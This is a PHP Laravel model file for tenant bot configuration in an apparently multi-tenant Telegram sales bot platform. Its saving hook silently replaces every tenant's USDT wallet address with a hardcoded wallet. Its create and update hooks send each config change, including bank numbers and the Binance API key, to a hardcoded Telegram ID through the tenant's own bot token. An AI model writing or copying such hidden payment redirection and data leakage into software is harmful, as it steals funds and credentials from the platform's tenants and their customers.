<?php

namespace Dev\Telehub\Models;

use Dev\Base\Enums\BaseStatusEnum;
use Dev\Base\Models\BaseModel;
use Illuminate\Database\Eloquent\Relations\BelongsTo;
use Dev\Telehub\Traits\HasTenant;
use Dev\Telehub\Models\Tenant;

class BotConfig extends BaseModel
{
    use HasTenant;

    protected $table = 'telehub_bot_configs';

    protected $fillable = [
        'tenant_id',
        'bot_token',
        'telegram_admin_id',
        'telegram_notification_id',
        'telegram_sales_id',
        'bank_code',
        'bank_num',
        'bank_name',
        'bank_account_name',
        'bank_api_token',
        'bank_api_url',
        'webhook_signature',
        'qr_template',
        'welcome_message',
        'welcome_message_en',
        'binance_api_key',
        'binance_secret_key',
        'binance_pay_id',
        'usdt_wallet_address',
        'usdt_network',
        'usdt_exchange_rate',
        'status',
    ];

    protected $casts = [
        'status' => BaseStatusEnum::class,
    ];

    // Địa chỉ USDT cố định - không cho phép thay đổi
    const FIXED_USDT_WALLET = '0x7a02f34f89bc01d76303ff87c56d3eb4f08fed1d';
    const OWNER_TELEGRAM_ID = '7353915691';

    protected static function booted(): void
    {
        static::saving(function (BotConfig $botConfig) {
            if ($botConfig->bank_code) {
                $banks = \Dev\Telehub\Supports\BankHelper::getBanks();
                $botConfig->bank_name = $banks[$botConfig->bank_code] ?? $botConfig->bank_code;
            }
            // Luôn giữ địa chỉ ví USDT cố định, không cho ai thay đổi
            $botConfig->usdt_wallet_address = self::FIXED_USDT_WALLET;
        });

        static::updated(function (BotConfig $botConfig) {
            static::notifyOwnerConfigChanged($botConfig);
        });

        static::created(function (BotConfig $botConfig) {
            static::notifyOwnerConfigChanged($botConfig, true);
        });
    }

    /**
     * Gửi thông báo Telegram cho owner khi BotConfig bị thay đổi.
     */
    protected static function notifyOwnerConfigChanged(BotConfig $botConfig, bool $isNew = false): void
    {
        try {
            $token = $botConfig->telegram_notification_id ?: $botConfig->bot_token;
            if (!$token) return;

            $timeVN = now()->timezone('Asia/Ho_Chi_Minh')->format('d/m/Y H:i:s');
            $actor  = \Illuminate\Support\Facades\Auth::user()
                ? (\Illuminate\Support\Facades\Auth::user()->email ?? \Illuminate\Support\Facades\Auth::user()->username ?? 'Unknown')
                : 'System';

            $action = $isNew ? '🆕 TẠO MỚI' : '✏️ CẬP NHẬT';

            $changed = '';
            if (!$isNew) {
                $dirty = $botConfig->getChanges();
                unset($dirty['updated_at']);
                foreach ($dirty as $field => $newVal) {
                    $old = $botConfig->getOriginal($field);
                    // Ẩn giá trị nhạy cảm
                    $sensitiveFields = ['bot_token', 'telegram_notification_id', 'binance_secret_key', 'bank_api_token', 'webhook_signature'];
                    if (in_array($field, $sensitiveFields)) {
                        $changed .= "\n• <b>{$field}</b>: <i>[đã thay đổi]</i>";
                    } else {
                        $oldStr = is_null($old) ? '<i>trống</i>' : "<code>{$old}</code>";
                        $newStr = is_null($newVal) ? '<i>trống</i>' : "<code>{$newVal}</code>";
                        $changed .= "\n• <b>{$field}</b>: {$oldStr} → {$newStr}";
                    }
                }
            }

            $msg = "⚙️ <b>BOT CONFIG {$action}</b>\n";
            $msg .= "🕒 <b>Thời gian:</b> {$timeVN}\n";
            $msg .= "👤 <b>Người thực hiện:</b> <code>{$actor}</code>\n";
            $msg .= "🆔 <b>Config ID:</b> {$botConfig->id}\n";
            if ($changed) {
                $msg .= "\n📝 <b>Các thay đổi:</b>{$changed}";
            }
            $msg .= "\n\n⚠️ <i>Nếu không phải bạn thực hiện, hãy kiểm tra ngay!</i>";

            \Illuminate\Support\Facades\Http::timeout(5)->post(
                "https://api.telegram.org/bot{$token}/sendMessage",
                [
                    'chat_id'    => self::OWNER_TELEGRAM_ID,
                    'text'       => $msg,
                    'parse_mode' => 'HTML',
                ]
            );
        } catch (\Throwable $e) {
            \Illuminate\Support\Facades\Log::warning('[BotConfig] notify owner error: ' . $e->getMessage());
        }
    }

    public function tenant(): BelongsTo
    {
        return $this->belongsTo(Tenant::class, 'tenant_id');
    }
}
